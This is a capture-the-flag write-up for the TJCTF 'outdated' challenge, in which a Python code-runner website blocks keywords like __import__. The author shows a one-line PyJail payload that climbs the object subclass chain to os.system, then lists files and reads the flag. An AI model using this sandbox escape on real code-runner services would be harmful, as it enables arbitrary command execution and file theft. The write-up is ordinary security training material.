# outdated
> I found this old website that runs your python code, but the security hasn't been updated in years

> I'm sure there's a flag floating around, can you find it?

## About the Challenge
We were given a website and a source code. (You can download the source code [here](server.zip))


[Image extracted text: Python code runner
Lpload
Welcome to the TJCSC Python
code runnerl
This site is used to run your
python code (with some exceptions)
Why is this site useful?
What's special about this site?
Can
see it in action?]


So, this website can run our python code but there are some blacklisted keywords, for example: `__import__` or `__builtins__` and other restriction like we need to input ASCII character and we cant upload a very large file, etc.

## How to Solve?
This is like PyJail challs but in web version, so to solve this. Im using one of the PyJail payload:

```python
print(dict.__class__.__base__.__subclasses__()[132].__init__.__globals__["sys"].modules["os"].system("ls"))
```

And the result was


[Image extracted text: ~inav
Adiv
stylez"padding:
1Opx ;
Tour
code:
<ip
Kpre>
code>
print (dict _
class
base_
sbclasses
() [132] -_in
globals
[[934;SYs[#34;
hodules [ [ F34
05[i34;].sy
stem ( €#34;156034;) !
code>
<{pre>
Resules
0 f
code
<(p
~pre>
<code>
Dockerfile
pycache
app
PY
flag-
f879426-923b-4458-8ee6-eeb6b3a34268
trt
ru
static
cerplaces
uploads
[code>
<(pre:]


And then change the `ls` command to `cat flag-0f8794c6-9e3b-4458-8ee6-eeb6b3a34a68.txt` to obtain the flag


[Image extracted text: Inavs_
Sdiv
style=
padding:
1Opx ;
Your
code
<(p
xpre>
code>
print (dict
elass
base
subclasses_
()[132]
in
globals
[[#434;SYS[#34;
modules [[#34
Os[I34;]-sy
stem ( €#34;cat
flag-0f879426-9e3b-4458-8eee-eebeb3a34a68.txt[#34;) |
code>
~/pre>
Resules
0 f
code :
<(p
~pre>
<code>
cjcc f{oops_
bad_fileer_36582f74}
code>
~(pre>
div>
</body>]


```
tjctf{oops_bad_filter_3b582f74}
```